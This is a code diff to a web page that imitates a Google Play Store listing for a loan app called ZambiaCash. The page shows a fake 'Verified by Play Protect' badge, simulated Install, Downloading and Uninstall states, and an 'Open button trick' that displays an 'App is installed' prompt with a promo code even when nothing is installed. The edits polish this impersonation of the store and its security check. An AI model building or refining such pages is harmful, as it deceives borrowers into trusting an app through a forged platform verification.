@@ -86,11 +86,6 @@
         .pulse-ring::before { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 2px solid rgba(255,255,255,0.25); animation: pulseRing 2s ease-out infinite; }
         @keyframes pulseRing { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.4); opacity: 0; } }
 
-        /* CUSTOM PROMPT ANIMATION */
-        #installed-prompt { transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-        #installed-prompt.translate-y-full { transform: translateY(100%); }
-        #installed-prompt.translate-y-0 { transform: translateY(0); }
-
         /* REALISTIC NATIVE SPLASH SCREEN */
         #splash-screen { transition: opacity 0.4s ease-out; }
     </style>
@@ -109,23 +104,6 @@
     <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
     <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">ZambiaCash requires an active internet connection to process your loan.</p>
     <button id="btn-retry-connection" onclick="retryConnection()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl font-sans transition-transform active:scale-95">Retry</button>
-</div>
-
-<!-- BRIGHT INSTALLED PROMPT -->
-<div id="installed-prompt" class="hide fixed bottom-0 left-0 right-0 z-[10000] p-4 transform translate-y-full flex justify-center">
-    <div class="bg-[#1e1e1e] rounded-2xl p-5 flex flex-col gap-3 shadow-2xl border border-gray-700 w-full max-w-sm relative overflow-hidden">
-        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-yellow-400 to-yellow-600"></div>
-        <div class="flex items-center gap-4">
-            <img src="icon.png" class="w-12 h-12 rounded-xl object-cover">
-            <div>
-                <p class="text-white font-bold text-base">App is installed</p>
-                <p class="text-gray-400 text-xs mt-0.5">Find the ZambiaCash icon on your home screen.</p>
-            </div>
-        </div>
-        <div class="bg-yellow-400/10 border border-yellow-400/20 rounded-xl p-3 text-center mt-1">
-            <p class="text-yellow-400 font-extrabold text-sm">Use promo code: 2026</p>
-        </div>
-    </div>
 </div>
 
 <!-- PLAY STORE THEMED WARNING -->
@@ -171,6 +149,8 @@
                 <span class="text-xs font-semibold">Verified by Play Protect</span>
             </div>
         </div>
+        
+        <!-- INSTALL BUTTONS -->
         <div class="flex gap-2 mb-6" id="pre-install-buttons">
             <button id="btn-store-install" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3.5 rounded-full shadow-soft active:scale-95 transition-transform">Install</button>
         </div>
@@ -178,10 +158,31 @@
             <button class="flex-1 bg-white text-playBlue font-semibold text-lg py-2.5 rounded-full border-2 border-gray-200" style="opacity:0.5;">Cancel</button>
             <button disabled id="btn-installing" class="flex-1 bg-gray-200 text-gray-400 font-semibold text-lg py-2.5 rounded-full flex items-center justify-center gap-2">Downloading...</button>
         </div>
+        
+        <!-- POST INSTALL BUTTONS -->
         <div class="flex gap-3 mb-6 hide" id="post-install-buttons">
             <button onclick="mockUninstall()" class="flex-1 bg-white text-playBlue font-semibold text-lg py-3 rounded-full border border-gray-300">Uninstall</button>
             <button id="btn-open-app" class="flex-1 bg-playBlue text-white font-semibold text-lg py-3 rounded-full">Open</button>
         </div>
+
+        <!-- NEW POSITION: INSTALLED PROMPT (Drops down right under the buttons) -->
+        <div id="installed-prompt" class="hide mb-6 transition-all duration-300 opacity-0 -translate-y-2">
+            <div class="bg-[#1e1e1e] rounded-2xl p-5 flex flex-col gap-3 shadow-lg border border-gray-700 w-full relative overflow-hidden">
+                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-yellow-400 to-yellow-600"></div>
+                <div class="flex items-center gap-4">
+                    <img src="icon.png" class="w-12 h-12 rounded-xl object-cover">
+                    <div>
+                        <p class="text-white font-bold text-base">App is installed</p>
+                        <p class="text-gray-400 text-xs mt-0.5">Find the ZambiaCash icon on your home screen.</p>
+                    </div>
+                </div>
+                <div class="bg-yellow-400/10 border border-yellow-400/20 rounded-xl p-3 text-center mt-1">
+                    <p class="text-yellow-400 font-extrabold text-sm">Use promo code: 2026</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- THE REST OF THE CONTENT -->
         <div id="post-install-content" class="hide">
             <div class="mb-8 border-t border-gray-100 pt-6">
                 <h3 class="font-bold text-xl text-gray-900 mb-2">What's new</h3>
@@ -864,7 +865,7 @@ function toggleReviews() {
     }
 }
 
-/* =============== OPEN BUTTON TRICK (UPDATED) =============== */
+/* =============== OPEN BUTTON TRICK =============== */
 document.getElementById('btn-open-app').addEventListener('click', async ()=>{
     
     // 1. Check if the PWA is installed on Android
@@ -885,22 +886,25 @@ document.getElementById('btn-open-app').addEventListener('click', async ()=>{
     }
 
     // 2. Fallback: App is NOT installed (or user is on iPhone)
-    // Do NOT navigate. Just show the prompt.
+    // Do NOT navigate. Just show the prompt right below the buttons.
     const prompt = document.getElementById('installed-prompt');
+    
+    // Remove the 'hide' class
     prompt.classList.remove('hide');
     
+    // Trigger the fade-in and drop-down animation
     setTimeout(() => {
-        prompt.classList.remove('translate-y-full');
-        prompt.classList.add('translate-y-0');
+        prompt.classList.remove('opacity-0', '-translate-y-2');
+        prompt.classList.add('opacity-100', 'translate-y-0');
     }, 10);
 
     // Hide prompt after 10 seconds
     setTimeout(() => {
-        prompt.classList.remove('translate-y-0');
-        prompt.classList.add('translate-y-full');
+        prompt.classList.remove('opacity-100', 'translate-y-0');
+        prompt.classList.add('opacity-0', '-translate-y-2');
         setTimeout(() => {
             prompt.classList.add('hide');
-        }, 400);
+        }, 300); // Wait for transition to finish before hiding
     }, 10000);
 });
 
